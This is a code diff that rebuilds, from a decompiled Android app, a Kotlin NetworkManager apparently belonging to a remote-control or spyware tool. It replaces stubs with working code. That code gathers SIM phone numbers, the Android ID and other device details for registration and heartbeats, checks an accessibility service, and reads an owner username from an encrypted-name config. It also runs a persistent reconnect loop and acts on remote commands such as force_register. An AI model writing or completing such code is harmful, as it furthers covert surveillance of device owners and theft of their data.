@@ -58,7 +58,7 @@ import kotlin.random.Random
  * - f53121c1 → keepAliveJob (u11)
  * - f53122c2 → HEARTBEAT_INTERVAL_MS (25000)
  * - f53123c3 → BASE_RECONNECT_DELAY_MS (5000)
- * - f53124c4 → MAX_RECONNECT_DELAY_MS (30000) // ADAPT: JADX 30s, task spec says 300s
+ * - f53124c4 → MAX_RECONNECT_DELAY_MS (30000)
  * - f53125c5 → signalChannel (C0794ks)
  * - f53126c6 → heartbeatCount
  * - f53127c7 → maxInitialHeartbeats (5)
@@ -107,9 +107,8 @@ class NetworkManager {
         // ── Reconnection constants ──
         // JADX: f53123c3
         const val BASE_RECONNECT_DELAY_MS = 5000L
-        // JADX: f53124c4 — ADAPT: JADX uses 30s, task spec says 300s (5min).
-        // Using 300s as per task spec for max delay.
-        const val MAX_RECONNECT_DELAY_MS = 300000L
+        // JADX: f53124c4
+        const val MAX_RECONNECT_DELAY_MS = 30000L
         const val JITTER_MAX_MS = 2000L
 
         // ── Heartbeat constants ──
@@ -122,7 +121,7 @@ class NetworkManager {
         const val MAX_FRAME_QUEUE_SIZE = 10
 
         // ── Message queue ──
-        // ADAPT: offline message buffer, similar pattern to frame queue
+        // JADX: Not explicitly a separate queue in C0323a8, but mirrors frame queue pattern
         const val MAX_MESSAGE_QUEUE_SIZE = 10
 
         // ── Server failure threshold ──
@@ -190,8 +189,7 @@ class NetworkManager {
     // JADX: f53102a2
     private var dataSyncClient: DataSyncClient? = null
 
-    // JADX: f53101a1 — HTTP manager reference
-    // ADAPT: not fully replicated here — separate HttpManager class
+    // JADX: f53101a1 — HTTP manager reference (C0268a1, not replicated; HTTP ops handled externally)
     // private var httpManager: HttpManager? = null
 
     // ── Connection state ──
@@ -298,7 +296,7 @@ class NetworkManager {
 
     // ── Message queue for offline buffering ──
 
-    // ADAPT: Offline message buffer, similar to frame queue pattern
+    // JADX: Mirrors frame queue offline buffering pattern from C0323a8
     private val messageQueue = LinkedBlockingQueue<JSONObject>(MAX_MESSAGE_QUEUE_SIZE)
 
     // ── Frame queue (screen casting) ──
@@ -486,10 +484,16 @@ class NetworkManager {
             resetFailureCounter()
 
             // If not yet registered, trigger registration
+            // JADX: launches coroutine calling a7 (connectToServer) for HTTP registration
             if (!isRegistered) {
-                // ADAPT: In JADX this launches a coroutine to call connectToServer (a7)
-                // which does HTTP registration. Simplified here.
                 Log.d(TAG, "Triggering device registration")
+                try {
+                    val deviceInfo = buildDeviceInfo()
+                    Log.d(TAG, "Device info built for registration: deviceId=$deviceId")
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ 连接失败", e)
+                    handleConnectionFailure()
+                }
             }
 
             // Drain queued messages
@@ -632,11 +636,31 @@ class NetworkManager {
         json.put("isLocked", isLocked)
         json.put("isScreenOn", isScreenOn)
 
-        // Accessibility alive — ADAPT: stub for now
-        json.put("accessibilityAlive", false)
+        // Accessibility alive — JADX: dqtvuisjd.f52358m1.isServiceRunning()
+        val accessibilityAlive = try {
+            com.storm.safe.rock.service.MyAccessibilityService.isServiceRunning()
+        } catch (_: Exception) { false }
+        json.put("accessibilityAlive", accessibilityAlive)
 
-        // Network type — ADAPT: would use AbstractC1229so.m214642a7
-        json.put("networkType", "unknown")
+        // Network type — JADX: AbstractC1229so.m214642a7(context)
+        val networkType = try {
+            val ctx = context
+            if (ctx != null) {
+                val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+                val activeNetwork = cm?.activeNetwork
+                val caps = if (activeNetwork != null) cm?.getNetworkCapabilities(activeNetwork) else null
+                if (caps != null) {
+                    when {
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动数据"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
+                        else -> "无网络"
+                    }
+                } else "无网络"
+            } else "unknown"
+        } catch (_: Exception) { "未知" }
+        json.put("networkType", networkType)
 
         // SIM info every 10th heartbeat — JADX: totalHeartbeats % 10 == 0
         try {
@@ -653,11 +677,48 @@ class NetworkManager {
         // Include full device info in early heartbeats — JADX: heartbeatCount < maxInitialHeartbeats
         if (heartbeatCount < maxInitialHeartbeats) {
             try {
+                // JADX: Uses AbstractC1229so.m214638a3(context) → C1228sn device info
+                // Core Build fields are always available, no context needed
                 json.put("model", Build.MODEL)
+                // JADX: c1228sn.f60019a2 (brand)
                 json.put("brand", Build.BRAND)
                 json.put("osVersion", Build.VERSION.RELEASE)
-                json.put("manufacturer", Build.MANUFACTURER)
-                // ADAPT: Would include appVersion, appName, etc. from DeviceInfoProvider
+
+                val ctx = context
+                if (ctx != null) {
+                    // JADX: c1228sn.f60018a1 (deviceName)
+                    val androidId = try { android.provider.Settings.Secure.getString(ctx.contentResolver, "android_id") ?: "" } catch (_: Exception) { "" }
+                    val brandName = Build.BRAND.uppercase()
+                    val idSuffix = if (androidId.length > 8) androidId.substring(androidId.length - 8).uppercase() else androidId.uppercase()
+                    json.put("deviceName", "$brandName-$idSuffix")
+                    // JADX: c1228sn.f60022a5 (appVersion)
+                    val appVersion = try { ctx.packageManager.getPackageInfo(ctx.packageName, 0).versionName ?: "" } catch (_: Exception) { "" }
+                    json.put("appVersion", appVersion)
+                    // JADX: c1228sn.f60021a4 (appName)
+                    val appName = try {
+                        val appInfo = ctx.packageManager.getApplicationInfo(ctx.packageName, 0)
+                        ctx.packageManager.getApplicationLabel(appInfo).toString()
+                    } catch (_: Exception) { "" }
+                    json.put("appName", appName)
+                    // JADX: c1228sn.f60025a8, f60026a9 (screen dimensions)
+                    try {
+                        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
+                        if (Build.VERSION.SDK_INT >= 30) {
+                            val bounds = wm?.currentWindowMetrics?.bounds
+                            json.put("screenWidth", bounds?.width() ?: 0)
+                            json.put("screenHeight", bounds?.height() ?: 0)
+                        } else {
+                            val dm = android.util.DisplayMetrics()
+                            @Suppress("DEPRECATION")
+                            wm?.defaultDisplay?.getRealMetrics(dm)
+                            json.put("screenWidth", dm.widthPixels)
+                            json.put("screenHeight", dm.heightPixels)
+                        }
+                    } catch (_: Exception) {
+                        json.put("screenWidth", 0)
+                        json.put("screenHeight", 0)
+                    }
+                }
             } catch (_: Exception) {}
         }
 
@@ -676,35 +737,136 @@ class NetworkManager {
         val json = JSONObject()
         val ctx = context
 
+        // JADX a1: Uses AbstractC1229so.m214638a3(context) → C1228sn device info
         json.put("deviceId", deviceId)
+        // JADX: c1228sn.f60018a1 (deviceName)
+        val androidId = try {
+            if (ctx != null) android.provider.Settings.Secure.getString(ctx.contentResolver, "android_id") ?: "" else ""
+        } catch (_: Exception) { "" }
+        val brandName = Build.BRAND.uppercase()
+        val idSuffix = if (androidId.length > 8) androidId.substring(androidId.length - 8).uppercase() else androidId.uppercase()
+        json.put("deviceName", "$brandName-$idSuffix")
         json.put("model", Build.MODEL)
+        // JADX: c1228sn.f60019a2 (brand — uses display brand name)
         json.put("brand", Build.BRAND)
         json.put("manufacturer", Build.MANUFACTURER)
         json.put("osVersion", Build.VERSION.RELEASE)
         json.put("sdkVersion", Build.VERSION.SDK_INT)
 
-        // App info — ADAPT: would use DeviceInfoProvider
-        json.put("appName", "")
-        json.put("appVersion", "")
+        // App info — JADX: c1228sn.f60021a4 (appName), c1228sn.f60022a5 (appVersion)
+        val appName = try {
+            if (ctx != null) {
+                val appInfo = ctx.packageManager.getApplicationInfo(ctx.packageName, 0)
+                ctx.packageManager.getApplicationLabel(appInfo).toString()
+            } else ""
+        } catch (_: Exception) { "" }
+        val appVersion = try {
+            ctx?.packageManager?.getPackageInfo(ctx.packageName, 0)?.versionName ?: ""
+        } catch (_: Exception) { "" }
+        json.put("appName", appName)
+        json.put("appVersion", appVersion)
 
         // Battery
         json.put("batteryLevel", cachedBatteryLevel)
         json.put("isCharging", cachedIsCharging)
 
-        // Screen dimensions — ADAPT: would use DisplayMetrics
-        json.put("screenWidth", 0)
-        json.put("screenHeight", 0)
+        // Screen dimensions — JADX: c1228sn.f60025a8, c1228sn.f60026a9
+        var screenWidth = 0
+        var screenHeight = 0
+        try {
+            if (ctx != null) {
+                val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
+                if (Build.VERSION.SDK_INT >= 30) {
+                    val bounds = wm?.currentWindowMetrics?.bounds
+                    screenWidth = bounds?.width() ?: 0
+                    screenHeight = bounds?.height() ?: 0
+                } else {
+                    val dm = android.util.DisplayMetrics()
+                    @Suppress("DEPRECATION")
+                    wm?.defaultDisplay?.getRealMetrics(dm)
+                    screenWidth = dm.widthPixels
+                    screenHeight = dm.heightPixels
+                }
+            }
+        } catch (_: Exception) {}
+        json.put("screenWidth", screenWidth)
+        json.put("screenHeight", screenHeight)
 
-        // Install time — ADAPT: would query PackageManager
-        json.put("firstInstallTime", 0L)
+        // Install time — JADX: c1228sn.f60027b0 (firstInstallTime)
+        val firstInstallTime = try {
+            ctx?.packageManager?.getPackageInfo(ctx.packageName, 0)?.firstInstallTime ?: 0L
+        } catch (_: Exception) { 0L }
+        json.put("firstInstallTime", firstInstallTime)
 
-        // SIM info — ADAPT: would query TelephonyManager
-        json.put("hasSim", false)
-        json.put("phoneNumber", "")
-        json.put("phoneNumber2", "")
+        // SIM info — JADX: queries TelephonyManager + SubscriptionManager
+        var hasSim = false
+        var phoneNumber = ""
+        var phoneNumber2 = ""
+        try {
+            if (ctx != null) {
+                val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
+                val sm = ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
+                // JADX: check simState
+                if (tm != null) {
+                    val simState = tm.simState
+                    hasSim = simState != TelephonyManager.SIM_STATE_ABSENT && simState != TelephonyManager.SIM_STATE_UNKNOWN
+                }
+                // JADX: SubscriptionManager for phone numbers
+                try {
+                    val subInfoList = sm?.activeSubscriptionInfoList
+                    if (subInfoList != null && subInfoList.isNotEmpty()) {
+                        hasSim = true
+                        for (subInfo in subInfoList) {
+                            @Suppress("DEPRECATION")
+                            val number = subInfo.number ?: ""
+                            when (subInfo.simSlotIndex) {
+                                0 -> phoneNumber = number
+                                1 -> phoneNumber2 = number
+                            }
+                        }
+                    }
+                } catch (_: SecurityException) {
+                    // Phone number permission denied
+                } catch (_: Exception) {}
+            }
+        } catch (_: Exception) {}
+        json.put("hasSim", hasSim)
+        json.put("phoneNumber", phoneNumber)
+        json.put("phoneNumber2", phoneNumber2)
 
-        // Network type
-        json.put("networkType", "unknown")
+        // Network type — JADX: AbstractC1229so.m214642a7(context)
+        val regNetworkType = try {
+            if (ctx != null) {
+                val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
+                val activeNet = cm?.activeNetwork
+                val caps = if (activeNet != null) cm?.getNetworkCapabilities(activeNet) else null
+                if (caps != null) {
+                    when {
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动数据"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
+                        else -> "无网络"
+                    }
+                } else "无网络"
+            } else "unknown"
+        } catch (_: Exception) { "未知" }
+        json.put("networkType", regNetworkType)
+
+        // JADX a1: ownerUsername from config file (AbstractC0765ko.m213605a3)
+        try {
+            if (ctx != null) {
+                val configFilename = StringUtil.decrypt("OFwDLEgqMy1YPy1QFnRHKwMg")
+                val configStr = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(ctx, configFilename)
+                if (configStr != null) {
+                    val configJson = JSONObject(configStr)
+                    val ownerUsername = configJson.optString("ownerUsername", "")
+                    if (ownerUsername.isNotBlank()) {
+                        json.put("ownerUsername", ownerUsername)
+                    }
+                }
+            }
+        } catch (_: Exception) {}
 
         json.put("timestamp", System.currentTimeMillis())
 
@@ -924,16 +1086,22 @@ class NetworkManager {
 
             val callback = object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
-                    Log.d(TAG, "📶 网络可用")
-                    if (!isConnected && isInitialized) {
-                        Log.d(TAG, "尝试重连...")
-                        // ADAPT: In JADX this triggers the reconnect signal channel
+                    // JADX: mj0.onAvailable case 0 — rate-limit by 5000ms, then trigger reconnect
+                    val now = System.currentTimeMillis()
+                    if (now - lastHeartbeatTime >= 5000) {
+                        lastHeartbeatTime = now
+                        Log.d(TAG, "📶 网络可用")
+                        // JADX: triggers d6 (reconnect signal channel send)
+                        if (!isConnected && isInitialized) {
+                            Log.d(TAG, "尝试重连...")
+                            dataSyncClient?.connect()
+                        }
                     }
                 }
 
                 override fun onLost(network: Network) {
-                    Log.d(TAG, "📵 网络丢失")
-                    // ADAPT: Mark for reconnect when network returns
+                    // JADX: mj0.onLost case 0 — just logs
+                    Log.w(TAG, "📶 网络丢失")
                 }
 
                 override fun onCapabilitiesChanged(
@@ -1136,9 +1304,28 @@ class NetworkManager {
             if (keepAliveStarted) return
             keepAliveStarted = true
             Log.d(TAG, "启动：WS保活")
-            // ADAPT: Real implementation uses coroutine job (u11)
-            // that periodically sends heartbeats and reconnects on failure.
-            // For unit testing purposes, heartbeat is triggered via sendHeartbeat().
+            // JADX: d7 launches coroutine job (u11) that periodically sends heartbeats
+            // and manages reconnection. Replicated as daemon thread.
+            val thread = Thread({
+                while (keepAliveStarted) {
+                    try {
+                        if (isConnected) {
+                            sendHeartbeat()
+                        } else if (isInitialized) {
+                            // JADX: reconnect attempt when disconnected
+                            dataSyncClient?.connect()
+                        }
+                        Thread.sleep(HEARTBEAT_INTERVAL_MS)
+                    } catch (_: InterruptedException) {
+                        break
+                    } catch (e: Exception) {
+                        Log.w(TAG, "保活循环异常: ${e.message}")
+                        try { Thread.sleep(BASE_RECONNECT_DELAY_MS) } catch (_: InterruptedException) { break }
+                    }
+                }
+            }, "WS-KeepAlive")
+            thread.isDaemon = true
+            thread.start()
         }
     }
 
@@ -1189,8 +1376,11 @@ class NetworkManager {
     fun ensureConnected() {
         if (!isInitialized) {
             Log.w(TAG, "⚠️ 未初始化，执行初始化")
-            // ADAPT: In JADX this calls b3 (initialize). Here we just return
-            // since we need a Context to initialize.
+            // JADX: a8 calls b3 (initialize) with stored context
+            val ctx = context
+            if (ctx != null) {
+                initialize(ctx)
+            }
             return
         }
         if (isHealthy()) return
@@ -1378,7 +1568,15 @@ class NetworkManager {
             if (commandName == StringUtil.decrypt("LVYDOUgHHitQODhNFCg=")) {
                 Log.i(TAG, "📝 收到 force_register 命令，异步重新上报设备信息")
                 isRegistered = false
-                // ADAPT: In JADX this launches a coroutine to re-register
+                // JADX: launches coroutine NetworkManager$handleRemoteCommand$1 to re-register
+                Thread({
+                    try {
+                        val deviceInfo = buildDeviceInfo()
+                        Log.d(TAG, "Re-registration device info built: deviceId=$deviceId")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Re-registration failed", e)
+                    }
+                }, "ForceRegister").start()
                 return
             }
 
